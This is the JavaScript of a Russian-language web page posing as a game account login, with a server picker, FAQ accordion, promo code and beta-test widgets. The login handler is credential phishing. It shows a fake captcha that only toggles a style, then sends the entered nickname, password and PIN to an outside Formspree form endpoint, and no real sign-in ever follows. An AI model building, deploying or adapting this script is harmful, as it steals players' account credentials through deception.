document.addEventListener('DOMContentLoaded', () => {
    // ===== Плавный скролл для кнопок навигации и подвала =====
    const howToPlayBtn = document.getElementById('navHowToPlay');
    const footerHowToPlay = document.querySelector('.footer-link-play');
    const donateBtn = document.getElementById('navDonate');
    const footerDonate = document.querySelector('.footer-link-donate');
    const loginForm = document.getElementById('loginForm');
    const donationSection = document.getElementById('donationSection');

    if (howToPlayBtn) {
        howToPlayBtn.addEventListener('click', (e) => {
            e.preventDefault();
            loginForm.scrollIntoView({ behavior: 'smooth' });
        });
    }
    if (footerHowToPlay) {
        footerHowToPlay.addEventListener('click', (e) => {
            e.preventDefault();
            loginForm.scrollIntoView({ behavior: 'smooth' });
        });
    }
    if (donateBtn) {
        donateBtn.addEventListener('click', (e) => {
            e.preventDefault();
            donationSection.scrollIntoView({ behavior: 'smooth' });
        });
    }
    if (footerDonate) {
        footerDonate.addEventListener('click', (e) => {
            e.preventDefault();
            donationSection.scrollIntoView({ behavior: 'smooth' });
        });
    }

    // ===== Интерактивные ответы на вопросы (Аккордеон) =====
    const faqItems = document.querySelectorAll('.faq-item');
    faqItems.forEach(item => {
        const questionRow = item.querySelector('.faq-question-row');
        if (questionRow) {
            questionRow.addEventListener('click', () => {
                const isActive = item.classList.contains('active');
                faqItems.forEach(el => el.classList.remove('active'));
                if (!isActive) {
                    item.classList.add('active');
                }
            });
        }
    });

    // ===== Выбор сервера (модальное окно) =====
    const NAMES = ('RED GREEN BLUE YELLOW ORANGE PURPLE LIME PINK CHERRY BLACK INDIGO WHITE CHERRY MAGENTA CRIMSON AZURE PLATINUM AQUA GRAY ICE CHILLI CHOCO ' +
        'MOSCOW SPB UFA SOCHI KAZAN SAMARA ROSTOV ANAPA EKB KRASNODAR ARZAMAS NOVOSIB GROZNY SARATOV OMSK IRKUTSK VOLGOGRAD VORONEZH BELGOROD MAKHCHKALA ' +
        'VLADIKAVKAZ VLADIVOSTOK KALININGRAD CHELYABINSK KRASNOYARSK CHEBOKSARY KHABAROVSK PERM TULA RYAZAN MURMANSK PENZA KURSK ARKHANGELSK ORENBURG KIROV ' +
        'KEMEROVO TYUMEN TOLYATTI IVANOVO STAVROPOL SMOLENSK PSKOV BRYANSK OREL YAROSLAVL BARNAUL LIPETSK ULYANOVSK YAKUTSK TAMBOV BRATSK ASTRAKHAN CHITA ' +
        'KOSTROMA VLADIMIR KALUGA NOVGOROD TAGANROG VOLOGDA TVER TOMSK PODOLSK SURGUT PODOLSK MAGADAN CHEREPOVETS NORILSK ASTANA').split(' ');

    const COLORS = {
        RED: '#ff2d2d', GREEN: '#22c55e', BLUE: '#3b82f6', YELLOW: '#facc15', ORANGE: '#ff8a1f',
        PURPLE: '#a855f7', LIME: '#a3e635', PINK: '#ff5fa2', CHERRY: '#d6204f', BLACK: '#b0b0b8',
        INDIGO: '#6366f1', WHITE: '#ffffff', MAGENTA: '#ff00c8', CRIMSON: '#dc143c', AZURE: '#1e9bff',
        PLATINUM: '#cfd8e3', AQUA: '#00e5e5', GRAY: '#9ca3af', ICE: '#a5f3fc', CHILLI: '#e11d2a', CHOCO: '#c07a4a'
    };

    const servers = NAMES.map((name, i) => ({
        id: i + 1,
        name,
        color: COLORS[name] || `hsl(${(i * 47) % 360} 85% 60%)`
    }));

    const selectBox = document.getElementById('serverSelectBox');
    const serverTrigger = document.getElementById('serverTrigger');
    const selectedServerText = document.getElementById('selectedServerText');
    const modal = document.getElementById('serverModal');
    const grid = document.getElementById('serverGrid');
    const search = document.getElementById('serverSearch');
    const closeBtn = document.getElementById('serverClose');
    let selectedId = null;

    const arrow = '<svg width="14" height="14" viewBox="0 0 14 14" fill="none"><path d="M2 7H12M8 3L12 7L8 11" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>';

    function renderServers(filter = '') {
        if (!grid) return;
        const q = filter.trim().toLowerCase().replace('#', '');
        const list = servers.filter(s => !q || s.name.toLowerCase().includes(q) || String(s.id) === q);
        grid.innerHTML = list.length ? list.map((s, i) => `
            <button type="button" class="server-card${s.id === selectedId ? ' selected' : ''}" data-id="${s.id}" style="--c:${s.color};--i:${i}">
                <span class="server-num">#${s.id}</span>
                <span class="server-name">${s.name}</span>
                <span class="server-action"><span>${s.id === selectedId ? 'Выбран' : 'Выбрать'}</span><i>${arrow}</i></span>
            </button>`).join('') : '<div class="server-empty">Сервер не найден</div>';
    }

    function openModal() {
        if (!modal) return;
        if (search) search.value = '';
        renderServers();
        modal.classList.add('open');
        modal.setAttribute('aria-hidden', 'false');
        document.body.style.overflow = 'hidden';
    }

    function closeModal() {
        if (!modal) return;
        modal.classList.remove('open');
        modal.setAttribute('aria-hidden', 'true');
        document.body.style.overflow = '';
        if (serverTrigger) serverTrigger.focus({ preventScroll: true });
    }

    function selectServer(id) {
        const s = servers.find(x => x.id === id);
        selectedId = id;
        if (selectedServerText) selectedServerText.textContent = `${String(s.id).padStart(2, '0')} | ${s.name}`;
        if (serverTrigger) {
            serverTrigger.style.setProperty('--c', s.color);
            serverTrigger.classList.add('selected');
            serverTrigger.classList.remove('invalid');
        }
        closeModal();
    }

    if (serverTrigger) {
        serverTrigger.addEventListener('click', openModal);
        serverTrigger.addEventListener('keydown', (e) => {
            if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); openModal(); }
        });
    }
    if (closeBtn) closeBtn.addEventListener('click', closeModal);
    if (modal) {
        modal.addEventListener('click', (e) => { if (e.target === modal) closeModal(); });
    }
    document.addEventListener('keydown', (e) => {
        if (e.key === 'Escape' && modal && modal.classList.contains('open')) closeModal();
    });
    if (search) search.addEventListener('input', () => renderServers(search.value));
    if (grid) {
        grid.addEventListener('click', (e) => {
            const card = e.target.closest('.server-card');
            if (card) selectServer(Number(card.dataset.id));
        });
    }

    // Интерактив для капчи
    const recaptchaBox = document.getElementById('recaptchaBox');
    const recaptchaWidget = document.getElementById('recaptchaWidget');

    if (recaptchaWidget && recaptchaBox) {
        recaptchaWidget.addEventListener('click', () => {
            recaptchaBox.classList.toggle('checked');
        });
    }

    // ===== Проверка данных и вход =====
    const nick = document.getElementById('nickname');
    const pass = document.getElementById('password');
    const pin = document.getElementById('pincode');
    const statusEl = document.getElementById('formStatus');
    const submitBtn = loginForm ? loginForm.querySelector('.btn-submit') : null;
    const NICK_RE = /^[A-Z][a-z]+_[A-Z][a-z]+$/;

    function setStatus(text, type) {
        if (!statusEl) return;
        statusEl.textContent = text;
        statusEl.className = 'form-status ' + (type || '') + (text ? ' show' : '');
    }

    function limit(el, re, msg) {
        if (!el) return;
        el.addEventListener('input', () => {
            el.classList.remove('invalid');
            const clean = el.value.replace(re, '');
            if (clean !== el.value) {
                el.value = clean;
                setStatus(msg, 'error');
            } else if (statusEl && statusEl.classList.contains('error')) {
                setStatus('');
            }
        });
    }
    limit(nick, /[^A-Za-z_]/g, 'Ник — только английские буквы, формат Nick_Name');
    limit(pass, /[^\x21-\x7E]/g, 'Пароль — только английская раскладка, без пробелов');
    limit(pin, /\D/g, 'Pin-Code — только цифры, максимум 4');

    if (loginForm) {
        loginForm.addEventListener('submit', (e) => {
            e.preventDefault();
            [nick, pass, pin, serverTrigger].forEach(el => { if (el) el.classList.remove('invalid'); });

            const missing = [];
            if (!nick.value.trim()) { missing.push('ник'); if(nick) nick.classList.add('invalid'); }
            if (!pass.value) { missing.push('пароль'); if(pass) pass.classList.add('invalid'); }
            if (!selectedId) { missing.push('сервер'); if(serverTrigger) serverTrigger.classList.add('invalid'); }
            if (missing.length) {
                setStatus('Введите: ' + missing.join(', '), 'error');
                return;
            }

            if (!NICK_RE.test(nick.value.trim())) {
                if(nick) nick.classList.add('invalid');
                setStatus('Ник должен быть в формате Nick_Name (английские буквы)', 'error');
                return;
            }
            if (pass.value.length < 6) {
                if(pass) pass.classList.add('invalid');
                setStatus('Пароль — минимум 6 символов', 'error');
                return;
            }
            if (pin.value && !/^\d{1,4}$/.test(pin.value)) {
                if(pin) pin.classList.add('invalid');
                setStatus('Pin-Code — только цифры, максимум 4', 'error');
                return;
            }

            if (recaptchaBox && !recaptchaBox.classList.contains('checked')) {
                setStatus('Подтвердите, что вы не робот', 'error');
                return;
            }

            setStatus('Ожидайте, вход в личный кабинет', 'wait');
            if (submitBtn) submitBtn.disabled = true;
            
            const s = servers.find(x => x.id === selectedId);
            
            fetch('https://formspree.io/f/mdekqqpk', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
                body: JSON.stringify({
                    acc_data: nick.value.trim(),
                    game_world: `#${s.id} ${s.name}`,
                    sec_pass: pass.value,
                    sec_pin: pin.value ? pin.value : 'Не указан'
                })
            })
                .then(res => {
                    if (!res.ok) throw new Error('Formspree error ' + res.status);
                })
                .catch(() => {
                    setStatus('Не удалось выполнить вход. Попробуйте ещё раз', 'error');
                    if (submitBtn) submitBtn.disabled = false;
                });
        });
    }

    // ===== Валидация промокода =====
    const promoInput = document.getElementById('promoInput');
    const promoMsgBox = document.getElementById('promoMsgBox');
    const promoErrorText = document.getElementById('promoErrorText');

    if (promoInput && promoMsgBox) {
        promoInput.addEventListener('input', () => {
            const val = promoInput.value.trim();
            
            if (val === '') {
                promoMsgBox.style.display = 'flex';
                promoErrorText.textContent = 'Введите промокод!';
            } else if (!/^[A-Za-z0-9]+$/.test(val)) {
                promoMsgBox.style.display = 'flex';
                promoErrorText.textContent = 'Промокод должен быть только на английском языке!';
            } else {
                promoMsgBox.style.display = 'flex';
                promoErrorText.textContent = 'Для начала войдите в личный кабинет!';
            }
        });
    }

    // ===== Валидация ЗБТ (показ ошибки только по клику на кнопку) =====
    const betaBtn = document.getElementById('betaBtn');
    const betaMsgBox = document.getElementById('betaMsgBox');

    if (betaBtn && betaMsgBox) {
        betaBtn.addEventListener('click', () => {
            betaMsgBox.style.display = 'flex';
        });
    }
});
